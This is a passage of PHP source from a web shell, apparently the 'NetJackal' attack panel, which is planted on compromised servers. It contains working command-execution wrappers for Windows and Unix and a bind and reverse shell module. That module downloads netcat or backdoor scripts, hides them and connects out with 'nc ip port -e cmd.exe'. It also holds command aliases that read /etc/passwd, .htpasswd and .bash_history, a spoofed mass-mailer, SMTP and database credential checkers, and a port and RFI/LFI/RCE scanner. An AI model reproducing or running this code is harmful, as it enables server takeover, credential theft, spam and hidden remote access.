			$href->setAttribute ( "href", hlinK ( 'p0d=' . base64_encode ( $url ) ) );
		}
	}
    $forms = $xpath->evaluate ( "/html/body//form" );
    for($i = 0; $i < $forms->length; $i ++) {
        $src = $forms->item ( $i );
        $url = $src->getAttribute ( 'src' );
        if (! empty ( $url )) {
            $pre = '';
            if (substr ( $url, 0, 4 ) != 'http') {
                $pre = $u ['scheme'] . "://" . $u ['host'] . $port;
                if ($url {0} != '/')
                    $pre .= $dir;
            }
            $url = $pre . $url;
            $src->removeAttribute ( 'action' );
            $src->setAttribute ( "action", hlinK ( 'p0d=' . base64_encode ( $url ) ) );
        }
    }
	$iframes = $xpath->evaluate ( "/html/body//iframe" );
	for($i = 0; $i < $iframes->length; $i ++) {
		$src = $iframes->item ( $i );
		$url = $src->getAttribute ( 'src' );
		if (! empty ( $url )) {
			$pre = '';
			if (substr ( $url, 0, 4 ) != 'http') {
				$pre = $u ['scheme'] . "://" . $u ['host'] . $port;
				if ($url {0} != '/')
					$pre .= $dir;
			}
			$url = $pre . $url;
			$src->removeAttribute ( 'src' );
			$src->setAttribute ( "src", hlinK ( 'p0d=' . base64_encode ( $url ) ) );
		}
	}
    $inputs = $xpath->evaluate ( "/html/body//input" );
    for($i = 0; $i < $inputs->length; $i ++) {
        $src = $inputs->item ( $i );
        $url = $src->getAttribute ( 'src' );
        if (! empty ( $url )) {
            $pre = '';
            if (substr ( $url, 0, 4 ) != 'http') {
                $pre = $u ['scheme'] . "://" . $u ['host'] . $port;
                if ($url {0} != '/')
                    $pre .= $dir;
            }
            $url = $pre . $url;
            $src->removeAttribute ( 'src' );
            $src->setAttribute ( "src", hlinK ( 'p0d=' . base64_encode ( $url ) ) );
        }
    }
	$scripts = $xpath->evaluate ( "/html//script" );
	for($i = 0; $i < $scripts->length; $i ++) {
		$src = $scripts->item ( $i );
		$url = $src->getAttribute ( 'src' );
		if (! empty ( $url )) {
			$pre = '';
			if (substr ( $url, 0, 4 ) != 'http') {
				$pre = $u ['scheme'] . "://" . $u ['host'] . $port;
				if ($url {0} != '/')
					$pre .= $dir;
			}
			$url = $pre . $url;
			$src->removeAttribute ( 'src' );
			$src->setAttribute ( "src", hlinK ( 'p0d=' . base64_encode ( $url ) ) );
		}
	}
	$html = $dom->saveHTML ();
	die ( $html );
}
function winshelL($command) {
	$name = whereistmP () . "\\" . uniqid ( 'NJ' );
	win_shell_execute ( 'cmd.exe', '', "/C $command >\"$name\"" );
	sleep ( 1 );
	$exec = file_get_contents ( $name );
	unlink ( $name );
	return $exec;
}
function ffishelL($command) {
	$name = whereistmP () . "\\" . uniqid ( 'NJ' );
	$api = new ffi ( "[lib='kernel32.dll'] int WinExec(char *APP,int SW);" );
	$res = $api->WinExec ( "cmd.exe /c $command >\"$name\"", 0 );
	while ( ! file_exists ( $name ) )
		sleep ( 1 );
	$exec = file_get_contents ( $name );
	unlink ( $name );
	return $exec;
}
function srvshelL($command) {
	$name = whereistmP () . "\\" . uniqid ( 'NJ' );
	$n = uniqid ( 'NJ' );
	$cmd = (empty ( $_SERVER ['ComSpec'] )) ? 'd:\\windows\\system32\\cmd.exe' : $_SERVER ['ComSpec'];
	win32_create_service ( array ('service' => $n, 'display' => $n, 'path' => $cmd, 'params' => "/c $command >\"$name\"" ) );
	win32_start_service ( $n );
	win32_stop_service ( $n );
	win32_delete_service ( $n );
	while ( ! file_exists ( $name ) )
		sleep ( 1 );
	$exec = file_get_contents ( $name );
	unlink ( $name );
	return $exec;
}
function get_mimE($filename) {
	global $windows;
	preg_match ( "/\.(.*?)$/", $filename, $m );
	if (! empty ( $m [1] )) {
		switch (strtolower ( $m [1] )) {
			case "ico" :
				return "image/x-icon";
			case "js" :
				return "application/javascript";
			case "json" :
				return "application/json";
			case "jpg" :
			case "jpeg" :
			case "jpe" :
				return "image/jpg";
			case "png" :
			case "gif" :
			case "bmp" :
				return "image/" . strtolower ( $m [1] );
			case "css" :
				return "text/css";
			case "xml" :
				return "application/xml";
			case "html" :
			case "htm" :
			case "php" :
				return "text/html";
			case "flv" :
				return "video/x-flv";
		}
	}
	if (checkfunctioN ( "mime_content_type" )) {
		$m = mime_content_type ( $filename );
	} elseif (checkfunctioN ( "finfo_open" )) {
		$finfo = finfo_open ( FILEINFO_MIME );
		$m = finfo_file ( $finfo, $filename );
		finfo_close ( $finfo );
	} else {
		if ($windows)
			return "application/octet-stream";
		if (! empty ( $_SERVER ['HTTP_USER_AGENT'] ) && strstr ( $_SERVER ['HTTP_USER_AGENT'], "Macintosh" )) {
			$m = trim ( shelL ( 'file -b --mime ' . $filename ) );
		} else {
			$m = trim ( shelL ( 'file -bi ' . $filename ) );
		}
	}
	$m = explode ( ";", $m );
	return trim ( $m [0] );
}
function comshelL($command, $ws) {
	$exec = $ws->exec ( "cmd.exe /c $command" );
	$so = $exec->StdOut ();
	return $so->ReadAll ();
}
function perlshelL($command) {
	$perl = new perl ( );
	ob_start ();
	$perl->eval ( "system('$command')" );
	$exec = ob_get_contents ();
	ob_end_clean ();
	return $exec;
}
function pythonshelL($command) {
	return python_eval ( "
import os
os.system('$command')
" );
}
function smtpchecK($addr, $user, $pass, $timeout) {
	$sock = @fsockopen ( $addr, 25, $n, $s, $timeout );
	if (! $sock)
		return - 1;
	fread ( $sock, 1024 );
	fputs ( $sock, 'ehlo ' . uniqid ( 'NJ' ) . "\r\n" );
	$res = substr ( fgets ( $sock, 512 ), 0, 1 );
	if ($res != '2')
		return 0;
	fgets ( $sock, 512 );
	fgets ( $sock, 512 );
	fgets ( $sock, 512 );
	fputs ( $sock, "AUTH LOGIN\r\n" );
	$res = substr ( fgets ( $sock, 512 ), 0, 3 );
	if ($res != '334')
		return 0;
	fputs ( $sock, base64_encode ( $user ) . "\r\n" );
	$res = substr ( fgets ( $sock, 512 ), 0, 3 );
	if ($res != '334')
		return 0;
	fputs ( $sock, base64_encode ( $pass ) . "\r\n" );
	$res = substr ( fgets ( $sock, 512 ), 0, 3 );
	if ($res != '235')
		return 0;
	return 1;
}
function mysqlchecK($host, $user, $pass, $timeout) {
	if (checkfunctioN ( 'mysql_connect' )) {
		$l = mysql_connect ( $host, $user, $pass );
		if ($l)
			return 1;
	}
	return 0;
}
function mssqlchecK($host, $user, $pass, $timeout) {
	if (checkfunctioN ( 'mssql_connect' )) {
		$l = mssql_connect ( $host, $user, $pass );
		if ($l)
			return 1;
	}
	return 0;
}
function checksmtP($host, $timeout) {
	$from = strtolower ( uniqid ( 'nj' ) ) . '@' . strtolower ( uniqid ( 'nj' ) ) . '.com';
	$sock = @fsockopen ( $host, 25, $n, $s, $timeout );
	if (! $sock)
		return - 1;
	$res = substr ( fgets ( $sock, 512 ), 0, 3 );
	if ($res != '220')
		return 0;
	fputs ( $sock, 'HELO ' . uniqid ( 'NJ' ) . "\r\n" );
	$res = substr ( fgets ( $sock, 512 ), 0, 3 );
	if ($res != '250')
		return 0;
	fputs ( $sock, "MAIL FROM: <$from>\r\n" );
	$res = substr ( fgets ( $sock, 512 ), 0, 3 );
	if ($res != '250')
		return 0;
	fputs ( $sock, "RCPT TO: <contact@netjackal.ir>\r\n" );
	$res = substr ( fgets ( $sock, 512 ), 0, 3 );
	if ($res != '250')
		return 0;
	fputs ( $sock, "DATA\r\n" );
	$res = substr ( fgets ( $sock, 512 ), 0, 3 );
	if ($res != '354')
		return 0;
	fputs ( $sock, "From: " . uniqid ( 'NJ' ) . " " . uniqid ( 'NJ' ) . " <$from>\r\nSubject: " . uniqid ( 'NJ' ) . "\r\nMIME-Version: 1.0\r\nContent-Type: text/plain;\r\n\r\n" . uniqid ( 'Hello ', true ) . "\r\n.\r\n" );
	$res = substr ( fgets ( $sock, 512 ), 0, 3 );
	if ($res != '250')
		return 0;
	return 1;
}
function replace_stR($s, $h) {
	$ret = $h;
	foreach ( $s as $k => $r )
		$ret = str_replace ( $k, $r, $ret );
	return $ret;
}
function check_urL($url, $method, $search = '200 301 302 403', $timeout = 3) {
	$u = parse_url ( $url );
	$method = strtoupper ( $method );
	$host = $u ['host'];
	$file = (! empty ( $u ['path'] )) ? $u ['path'] : '/';
	$port = (empty ( $u ['port'] )) ? 80 : $u ['port'];
	$data = (! empty ( $u ['query'] )) ? $u ['query'] : '';
	$GData = '';
	if ($method == 'GET' && ! empty ( $data ))
		$GData = "?$data";
	$sock = @fsockopen ( $host, $port, $en, $es, $timeout );
	if ($sock) {
		$pack = "$method $file$GData HTTP/1.0\r\nHost: $host\r\n";
		if ($method == 'GET')
			$pack .= "\r\n";
		else
			$pack .= "Content-Type: application/x-www-form-urlencoded\r\nContent-length: " . strlen ( $data ) . "\r\nAccept-Encoding: text\r\nConnection: close\r\n\r\n$data";
		$pack;
		fputs ( $sock, $pack );
		if ($search == '200 301 302 403') {
			$tmp = substr ( fgets ( $sock, 16 ), 9, 3 );
			if (strstr ( $search, $tmp ) !== false) {
				fclose ( $sock );
				return $tmp;
			} else {
				fclose ( $sock );
				return 0;
			}
		}
		while ( ! feof ( $sock ) ) {
			$res = trim ( fgets ( $sock ) );
			if (! empty ( $res ))
				if (strstr ( $res, trim ( $search ) ) !== false) {
					fclose ( $sock );
					return 1;
				}
		}
		fclose ( $sock );
	}
	return 0;
}
function get_sw_namE($host, $timeout) {
	$sock = @fsockopen ( $host, 80, $en, $es, $timeout );
	if ($sock) {
		$page = uniqid ( 'NJ' );
		fputs ( $sock, "GET /$page HTTP/1.0\r\n\r\n" );
		while ( ! feof ( $sock ) ) {
			$con = fgets ( $sock );
			if (strstr ( $con, 'Server:' )) {
				$ser = substr ( $con, strpos ( $con, ' ' ) + 1 );
				return  $ser;
			}
		}
		fclose ( $sock );
	}
	return 0;
}
function snmpchecK($ip, $com, $timeout) {
	$res = 0;
	$n = chr ( 0x00 );
	$packet = chr ( 0x30 ) . chr ( 0x26 ) . chr ( 0x02 ) . chr ( 0x01 ) . chr ( 0x00 ) . chr ( 0x04 ) . chr ( strlen ( $com ) ) . $com . chr ( 0xA0 ) . chr ( 0x19 ) . chr ( 0x02 ) . chr ( 0x01 ) . chr ( 0x01 ) . chr ( 0x02 ) . chr ( 0x01 ) . $n . chr ( 0x02 ) . chr ( 0x01 ) . $n . chr ( 0x30 ) . chr ( 0x0E ) . chr ( 0x30 ) . chr ( 0x0C ) . chr ( 0x06 ) . chr ( 0x08 ) . chr ( 0x2B ) . chr ( 0x06 ) . chr ( 0x01 ) . chr ( 0x02 ) . chr ( 0x01 ) . chr ( 0x01 ) . chr ( 0x01 ) . $n . chr ( 0x05 ) . $n;
	$sock = @fsockopen ( "udp://$ip", 161 );
	if (checkfunctioN ( 'socket_set_timeout' ))
		socket_set_timeout ( $sock, $timeout );
	fputs ( $sock, $packet );
	socket_set_timeout ( $sock, $timeout );
	$res = fgets ( $sock );
	fclose ( $sock );
	if ($res != '')
		return 1;
	else
		return 0;
}
function brshelL() {
	global $windows, $hcwd, $Resource_Dir;
	$_REQUEST ['C'] = (isset ( $_REQUEST ['C'] )) ? $_REQUEST ['C'] : 0;
	$addr = $Resource_Dir . 'br';
	$error = "Can not make backdoor file, go to writeable folder.";
	$n = uniqid ( 'NJ_' );
	if (! $windows)
		$n = ".$n";
	$d = whereistmP ();
	$name = $d . DIRECTORY_SEPARATOR . $n;
	$c = ($_REQUEST ['C']) ? 1 : 0;
	if (! empty ( $_REQUEST ['port'] ) && ($_REQUEST ['port'] <= 65535) && ($_REQUEST ['port'] >= 1)) {
		$port = ( int ) $_REQUEST ['port'];
		if ($windows) {
			if ($c) {
				$name .= '.exe';
				$bd = downloadiT ( "$addr/nc", $name );
				shelL ( "attrib +H $name" );
				if (! $bd)
					echo $error;
				else
					shelL ( "$name -L -p $port -e cmd.exe" );
			} else {
				$name = $name . '.pl';
				$bd = downloadiT ( "$addr/winbind.p", $name );
				shelL ( "attrib +H $name" );
				if (! $bd)
					echo $error;
				else
					shelL ( "perl $name $port" );
			}
		} else {
			if ($c) {
				$bd = downloadiT ( "$addr/bind.c", $name );
				if (! $bd)
					echo $error;
				else
					shelL ( "cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $port &" );
			} else {
				$bd = downloadiT ( "$addr/bind.p", $name );
				if (! $bd)
					echo $error;
				else
					shelL ( "cd $d;perl $n $port &" );
				echo "<font color=#FA0>Backdoor is waiting for you on $port.<br></font>";
			}
		}
	} elseif (! empty ( $_REQUEST ['rport'] ) && ($_REQUEST ['rport'] <= 65535) && ($_REQUEST ['rport'] >= 1) && ! empty ( $_REQUEST ['ip'] )) {
		$ip = $_REQUEST ['ip'];
		$port = ( int ) $_REQUEST ['rport'];
		if ($windows) {
			if ($c) {
				$name .= '.exe';
				$bd = downloadiT ( "$addr/nc", $name );
				shelL ( "attrib +H $name" );
				if (! $bd)
					echo $error;
				else
					shelL ( "$name $ip $port -e cmd.exe" );
			} else {
				$name = $name . '.pl';
				$bd = downloadiT ( "$addr/winrc.p", $name );
				shelL ( "attrib +H $name" );
				if (! $bd)
					echo $error;
				else
					shelL ( "perl.exe $name $ip $port" );
			}
		} else {
			if ($c) {
				$bd = downloadiT ( "$addr/rc.c", $name );
				if (! $bd)
					echo $error;
				else
					shelL ( "cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $ip $port &" );
			} else {
				$bd = downloadiT ( "$addr/rc.p", $name );
				if (! $bd)
					echo $error;
				else
					shelL ( "cd $d;perl $n $ip $port &" );
			}
		}
		echo '<font color=#FA0>Done!</font>';
	} else {
		echo '<form name=bind method="POST"><div class="fieldwrapper"><label class="styled" style="width:320px">Bind shell</label></div><div class="fieldwrapper"><label class="styled">Port:</label><div class="thefield"><input type="number" min="1" max="65535" name="port" value="55501" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Type:</label><div class="thefield"><ul style="margin-top:0;"><li><input type="radio" value="0" checked name="C" /> <label>PERL</label></li><li><input type="radio" name="C" value="1" /> <label>';
		if ($windows)
			echo 'EXE';
		else
			echo 'C';
		echo '</label></li></ul></div></div>' . $hcwd . '<div class="buttonsdiv"><input type="submit" value="Bind" style="margin-left: 150px;" /></div></form><form name=reverse method="POST"><div class="fieldwrapper"><label class="styled" style="width:320px">Reverse shell</label></div><div class="fieldwrapper"><label class="styled">IP:</label><div class="thefield"><input type="text" name="ip" value="';
		echo $_SERVER ['REMOTE_ADDR'];
		echo '" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Port:</label><div class="thefield"><input type="number" min="1" max="65535" name="rport" value="53" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Type:</label><div class="thefield"><ul style="margin-top:0;"><li><input type="radio" value="0" checked name="C" /> <label>PERL</label></li><li><input type="radio" name="C" value="1" /> <label>';
		if ($windows)
			echo 'EXE';
		else
			echo 'C';
		echo '</label></li></ul></div></div>' . $hcwd . '<div class="buttonsdiv"><input type="submit" value="Connect" style="margin-left: 150px;" /></div></form>';
	}
}
function showimagE($img) {
	global $Resource_Dir;
	echo '<img border=0 src="' . hlinK ( "imagE=$img&workingdiR=" . getcwd () ) . '"><br /><a href="javascript: history.go(-1)"><img src="' . $Resource_Dir . 'images/back.png" border="0" /><b>Back</b></a>';
}
function editoR($file = '') {
	global $hcwd, $cwd;
	if (! empty ( $_REQUEST ['filE'] ))
		$file = $_REQUEST ['filE'];
	if ($file == '')
		$file = $cwd;
	else
		$file = realpath ( $file );
	$data = "";
	if (is_file ( $file )) {
		if (! is_readable ( $file )) {
			echo "File is not readable";
		}
		if (! is_writeable ( $file )) {
			echo "File is not writeable";
		}
		$data = file_get_contents ( $file );
	}
	echo '<form method="POST" class="form"><div class="fieldwrapper"><label class="styled">File:</label><div class="thefield"><input type="text" name="filE" value="' . htmlspecialchars ( $file ) . '" size="40" />' . $hcwd . '</div></div><div class="buttonsdiv"><input type="submit" name="open" value="Open" style="margin-left: 150px;" /></div></form><form method="POST" class="form" onsubmit="setUnload(0)" ><div class="fieldwrapper"><label class="styled">Content:</label><div class="buttonsdiv"><div class="thefield"><input type="button" size="10" value="Select all" onClick="javascript:document.getElementById(\'edited\').select();"><input type="button" size="10" value=" Clean " onClick="javascript:document.getElementById(\'edited\').value=\'\';"></div></div></div><textarea class="lined" id="edited" name="edited" cols="80" rows="20" onchange="setUnload(1)">' . htmlspecialchars ( $data ) . '</textarea>' . $hcwd . '<input type="hidden" name="filE" value="' . htmlspecialchars ( $file ) . '"/><div class="buttonsdiv"><input type="submit" name="Save" value="Save" style="margin-left: 150px;" /></div></form>
<script type="text/javascript">
$(function() {
$(".lined").linedtextarea(
{selectedLine: 1}
);
});
</script>';
}
function webshelL() {
	global $windows, $hcwd, $cwd;
	if ($windows) {
		$alias = "<option value='netstat -an'>Display open ports</option><option value='tasklist'>List of processes</option><option value='systeminfo'>System information</option><option value='ipconfig /all'>IP configuration</option><option value='getmac'>Get MAC address</option><option value='net start'>Services list</option><option value='net view'>Machines in domain</option><option value='net user'>Users list</option><option value='shutdown -s -f -t 1'>Turn off the server</option>";
	} else {
		$alias = "<option value='netstat -an | grep -i listen'>Display open ports</option><option value='last -a -n 250 -i'>Show last 250 logged in users</option><option value='which nmap john nc ncat socat'>Usefull tools</option><option value='which wget curl lynx w3m fetch'>Downloaders</option><option value='find / -perm -2 -type d -print'>Find world-writable directories</option><option value='find . -perm -2 -type d -print'>Find world-writable directories(in current directory)</option><option value='find / -perm -2 -type f -print'>Find world-writable files</option><option value='find . -perm -2 -type f -print'>Find world-writable files(in current directory)</option><option value='find / -type f -perm 04000 -ls'>Find files with SUID bit set</option><option value='find / -type f -perm 02000 -ls'>Find files with SGID bit set</option><option value='find / -name .htpasswd -type f'>Find .htpasswd files</option><option value='find / -type f -name .bash_history'>Find .bash_history files</option><option value='cat /etc/syslog.conf'>View syslog.conf</option><option value='cat /etc/hosts'>View hosts</option><option value='ps auxw'>List of processes</option>";
		if (is_dir ( '/etc/valiases' ))
			$alias .= "<option value='ls -l /etc/valiases'>List of cPanel`s domains(valiases)</option>";
		if (is_dir ( '/etc/vdomainaliases' ))
			$alias .= "<option value='ls -l /etc/vdomainaliases'>List cPanel`s domains(vdomainaliases)</option>";
		if (file_exists ( '/var/cpanel/accounting.log' ))
			$alias .= "<option value='cat /var/cpanel/accounting.log'>Display cPanel`s log</option>";
		if (is_dir ( '/var/spool/mail/' ))
			$alias .= "<option value='ls /var/spool/mail/'>Mailboxes list</option>";
	}
	echo '<form method="POST" class="form">';
	if (! empty ( $_REQUEST ['cmd'] )) {
		echo '<div class="fieldwrapper"><label class="styled">Result:</label><div class="thefield"><pre>';
		echo shelL ( $_REQUEST ['cmd'] );
		echo '</pre></div></div>';
	}
	echo '<div class="fieldwrapper"><label class="styled">Command:</label><div class="thefield"><input type="text" name="cmd" value="';
	if (! empty ( $_REQUEST ['cmd'] ))
		echo htmlspecialchars ( ($_REQUEST ['cmd']) );
	elseif (! $windows)
		echo "cat /etc/passwd";
	echo '" size="30" /><br /></div></div>' . $hcwd . '<div class="buttonsdiv"><input type="submit" value="Execute" style="margin-left: 150px;" /></div></form><form method="POST" class="form"><div class="fieldwrapper"><label class="styled">Alias:</label><div class="thefield"><select name="cmd">' . $alias . '</select></div></div>' . $hcwd . '<div class="buttonsdiv"><input type="submit" value="Execute" style="margin-left: 150px;" /></div></form>';
}
function maileR() {
	global $hcwd, $cwd;
	if (! empty ( $_REQUEST ['subject'] ) && ! empty ( $_REQUEST ['body'] ) && ! empty ( $_REQUEST ['from'] ) && ! empty ( $_REQUEST ['to'] )) {
		$from = $_REQUEST ['from'];
		$subject = $_REQUEST ['subject'];
		$body = $_REQUEST ['body'];
		$to = explode ( "\n", $_REQUEST ['to'] );
		$headers = "From: $from";
		if (! empty ( $_REQUEST ['attach'] )) {
			if (is_readable ( $_REQUEST ['attach'] )) {
				$data = file_get_contents ( $_REQUEST ['attach'] );
				$mime_boundary = "----=" . md5 ( time () );
				;
				$headers .= "\nMIME-Version: 1.0\n" . "Content-Type: multipart/mixed; boundary=\"$mime_boundary\"";
				$data = chunk_split ( base64_encode ( $data ) );
				$type = get_mimE ( $_REQUEST ['attach'] );
				$body = "$mime_boundary\n" . "Content-Type: text/html; charset=\"iso-8859-1\"\n" . "Content-Transfer-Encoding: 7bit\n\n" . $body . "\n" . "$mime_boundary\n" . "Content-Type: $type; name=\"" . basename ( $_REQUEST ['attach'] ) . "\"\n" . "Content-Disposition: attachment; filename=\"" . basename ( $_REQUEST ['attach'] ) . "\"\n" . "Content-Transfer-Encoding: Base64\n\n" . $data . "\n" . "$mime_boundary--\n";
			}
		}
		$_SERVER ['PHP_SELF'] = "/";
		$_SERVER ['REMOTE_ADDR'] = '127.0.0.1';
		$_SERVER ['SERVER_NAME'] = 'google.com';
		echo "<pre>";
		foreach ( $to as $target ) {
			$info = explode ( '@', $target );
			$rsubject = str_replace ( '[EMAIL]', $target, $subject );
			$rsubject = str_replace ( '[USER]', $info [0], $rsubject );
			$rsubject = str_replace ( '[DOMAIN]', $info [1], $rsubject );
			$rbody = str_replace ( '[EMAIL]', $target, $body );
			$rbody = str_replace ( '[USER]', $info [0], $rbody );
			$rbody = str_replace ( '[DOMAIN]', $info [1], $rbody );
			for($i = 0; $i < ( int ) $_REQUEST ['count']; $i ++) {
				$target = trim ( $target );
				if (mail ( $target, $rsubject, $rbody, $headers ))
					echo "Email to " . htmlspecialchars ( $target ) . " sent!\r\n";
				else
					echo "Error: Can not send mail to " . htmlspecialchars ( $target ) . "!\r\n";
			}
		}
		echo "</pre><br />";
	} else {
		echo '<form name=client method="POST"><div class="fieldwrapper"><label class="styled" style="width:320px">Mail sender</label></div><div class="fieldwrapper"><label class="styled">SMTP:</label><div class="thefield">' . ini_get ( 'SMTP' ) . ':' . ini_get ( 'smtp_port' ) . '</div></div><div class="fieldwrapper"><label class="styled">From:</label><div class="thefield"><input type="email" name="from" value="evil@hell.gov" size="30" /></div></div><div class="fieldwrapper"><label class="styled">To:</label><div class="thefield"><textarea name="to">';
		if (! empty ( $_ENV ['SERVER_ADMIN'] ))
			echo $_ENV ['SERVER_ADMIN'];
		else
			echo 'admin@' . getenv ( 'HTTP_HOST' );
		echo '</textarea></div></div><div class="fieldwrapper"><label class="styled">Subject:</label><div class="thefield"><input type="text" name="subject" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Body:</label><div class="thefield"><textarea name="body">
For each address will be [USER], [DOMAIN] and [EMAIL] replaced in mail subject and body.

Ex. john@example.net
[USER] => john
[DOMAIN] => example.net
[EMAIL] => john@example.net

</textarea></div></div>
<div class="fieldwrapper"><label class="styled">Attachment:</label><div class="thefield"><input type="text" name="attach" value="';
		if (! empty ( $_REQUEST ['attacH'] ))
			echo htmlspecialchars ( $cwd . DIRECTORY_SEPARATOR . $_REQUEST ['attacH'] );
		echo '" /></div></div>
<div class="fieldwrapper"><label class="styled">Count:</label><div class="thefield"><input type="number" min="1" name="count" size="5" value="1" /></div></div>' . $hcwd . '<div class="buttonsdiv"><input type="submit" value="Send" style="margin-left: 150px;" /></div></form>';
	}
}
function flush_buffers() {
	ob_end_flush ();
	ob_flush ();
	flush ();
	ob_start ();
}
function scanneR() {
	global $windows, $hcwd, $Resource_Dir, $RFI_URL;
	if (! empty ( $_SERVER ['SERVER_ADDR'] ))
		$host = $_SERVER ['SERVER_ADDR'];
	else
		$host = '127.0.0.1';
	$udp = (empty ( $_REQUEST ['udp'] )) ? 0 : 1;
	$tcp = (empty ( $_REQUEST ['tcp'] )) ? 0 : 1;
	if (($udp || $tcp) && ! empty ( $_REQUEST ['target'] ) && ! empty ( $_REQUEST ['fromport'] ) && ! empty ( $_REQUEST ['toport'] ) && ! empty ( $_REQUEST ['timeout'] ) && ! empty ( $_REQUEST ['portscanner'] )) {
		$target = $_REQUEST ['target'];
		$from = ( int ) $_REQUEST ['fromport'];
		$to = ( int ) $_REQUEST ['toport'];
		$timeout = ( int ) $_REQUEST ['timeout'];
		$nu = 0;
		echo '<font color=#FA0>Port scanning started against ' . htmlspecialchars ( $target ) . ':<br />';
		$start = time ();
		for($i = $from; $i <= $to; $i ++) {
			if ($tcp) {
				if (checkthisporT ( $target, $i, $timeout )) {
					$nu ++;
					$ser = '';
					if (getservbyport ( $i, 'tcp' ))
						$ser = '(' . getservbyport ( $i, 'tcp' ) . ')';
					echo "$nu) $i $ser (<a href='telnet://$target:$i'>Connect</a>) [TCP]<br>";
				}
			}
			if ($udp)
				if (checkthisporT ( $target, $i, $timeout, 1 )) {
					$nu ++;
					$ser = '';
					if (getservbyport ( $i, 'udp' ))
						$ser = '(' . getservbyport ( $i, 'udp' ) . ')';
					echo "$nu) $i $ser [UDP]<br>";
				}
		}
		$time = time () - $start;
		echo "Done! ($time seconds)</font>";
	} elseif (! empty ( $_REQUEST ['securityscanner'] )) {
		echo '<font color=#FA0><pre>';
		$start = time ();
		$from = $_REQUEST ['from'];
		$to = $_REQUEST ['to'];
		$fIP = ip2long ( $from );
		$tIP = ip2long ( $to );
		if ($fIP > $tIP) {
			echo 'Invalid range!</pre></font>';
			return 0;
		}
		$timeout = ( int ) $_REQUEST ['timeout'];
		if (! empty ( $_REQUEST ['httpscanner'] )) {
			echo 'Loading web-server vulnerability DBs...<br />';
			@flush_buffers ();
			$DBs = array ('Directory', 'Files', 'RFI', 'LFI', 'RCE' );
			$file = array ();
			foreach ( $DBs as $db ) {
				$buglist = whereistmP () . DIRECTORY_SEPARATOR . "$db.pj";
				$dl = ((! file_exists ( $buglist ))) ? downloadiT ( $Resource_Dir . "scan_db/$db.txt", $buglist ) : true;
				if ($dl) {
					$file [$db] = file ( $buglist );
					echo "'$db' database Loaded.<br />";
				} else
					echo "Can not load '$db' database.<br />";
				@flush_buffers ();
			}
		}
		$fr = htmlspecialchars ( $from );
		echo "<br />Scanning $fr-$to:<br />";
		for($i = $fIP; $i <= $tIP; $i ++) {
			$ip = long2ip ( $i );
			echo "<br /><br />---------------- $ip ----------------<br />";
			if (! empty ( $_REQUEST ['nslookup'] )) {
				$hn = gethostbyaddr ( $ip );
				if ($hn != $ip)
					echo "-- Hostname: $hn<br />";
			}
			@flush_buffers ();
			if (! empty ( $_REQUEST ['ping'] )) {
				echo "-- Ping:<br />";
				$pres = (! $windows) ? shelL ( "ping -c 1 -W $timeout $ip" ) : shelL ( "ping -n 1 -w $timeout $ip" );
				if (strstr ( $pres, 'Received = 0' ) || strstr ( $pres, '0 received' )) {
					echo "Ping timeout!<br />";
					continue;
				} else
					echo '<font color="#E9CFEC">' . $pres . '</font><br />';
				@flush_buffers ();
			}
			if (! empty ( $_REQUEST ['tracert'] )) {
				echo "-- Traceroute:<br />";
				$tres = (! $windows) ? shelL ( "traceroute -w $timeout $ip" ) : shelL ( "tracert -w $timeout $ip" );
				echo '<font color="#E9CFEC">' . $tres . '</font><br />';
				@flush_buffers ();
			}
			if (! empty ( $_REQUEST ['tcppscanner'] )) {
				$port = $_REQUEST ['port'];
				if (strstr ( $port, ',' ))
					$p = explode ( ',', $port );
				else
					$p [0] = $port;
				$open = $ser = '';
				foreach ( $p as $po ) {
					$scan = checkthisporT ( $ip, $po, $timeout );
					if ($scan) {
						$ser = '';
						if ($ser = getservbyport ( $po, 'tcp' ))
							$ser = "($ser)";
						$open .= " $po$ser ";
					}
				}
				if ($open) {
					echo "-- TCP open ports:$open<br />";
					@flush_buffers ();
				}
			}
			if (! empty ( $_REQUEST ['udppscanner'] )) {
				$port = $_REQUEST ['udport'];
				if (strstr ( $port, ',' ))
					$p = explode ( ',', $port );
				else
					$p [0] = $port;
				$open = $ser = '';
				foreach ( $p as $po ) {
					$scan = checkthisporT ( $ip, $po, $timeout, 1 );
					if ($scan) {
						$ser = '';
						if ($ser = getservbyport ( $po, 'tcp' ))
							$ser = "($ser)";
						$open .= " $po$ser ";
					}
				}
				if ($open) {
					echo "-- UDP open ports:$open<br>";
					@flush_buffers ();
				}
			}
			if (! empty ( $_REQUEST ['httpbanner'] )) {
				$res = get_sw_namE ( $ip, $timeout );
				if ($res) {
					echo "-- Webserver software: ";
					if ($res)
						echo 'Unknow';
					else
						echo $res;
					echo '<br />';
					@flush_buffers ();
				}
			}
			if (! empty ( $_REQUEST ['httpscanner'] )) {
				echo "-- Webserver security:<br />";
				if (checkthisporT ( $ip, 80, $timeout ) && ! empty ( $file ) && ! check_urL ( 'http://' . $ip . '/' . uniqid ( 'TEST_' ), 'GET', '200 301 302 403', $timeout )) {
					echo "Directory scan:<br />";
					foreach ( $file ['Directory'] as $k => $v ) {
						@flush_buffers ();
						$v = trim ( $v );
						$res = check_urL ( 'http://' . $ip . '/' . $v, 'GET', '200 301 302 403', $timeout );
						if ($res) {
							echo "<a href='http://$ip/$v' target='_blank'>http://$ip/$v</a> ($res)<br />";
						}
					}
					echo "File scan:<br />";
					foreach ( $file ['Files'] as $k => $v ) {
						@flush_buffers ();
						$v = trim ( $v );
						$res = check_urL ( 'http://' . $ip . '/' . $v, 'GET', '200 301 302 403', $timeout );
						if ($res)
							echo "<a href='http://$ip/$v' target='_blank'>http://$ip/$v</a> ($res)<br />";
					}
					echo "RFI scan:<br />";
					foreach ( $file ['RFI'] as $k => $v ) {
						@flush_buffers ();
						$v = trim ( $v );
						$v = str_replace ( '%RFI%', $RFI_URL, $v );
						if (strstr ( getiT ( 'http://' . $ip . '/' . $v, $headers ), 'NetJackal' ))
							echo "<a href='http://$ip/$v' target='_blank'>http://$ip/$v</a><br />";
					}
					echo "RCE scan:<br />";
					foreach ( $file ['RCE'] as $k => $v ) {
						$v = trim ( $v );
						$v = str_replace ( '%RFI%', $RFI_URL, $v );
						if (strstr ( getiT ( 'http://' . $ip . '/' . $v, $headers ), 'root:' ))
							echo "<a href='http://$ip/$v' target='_blank'>http://$ip/$v</a><br />";
					}
					echo "LFI scan:<br />";
					foreach ( $file ['LFI'] as $k => $v ) {
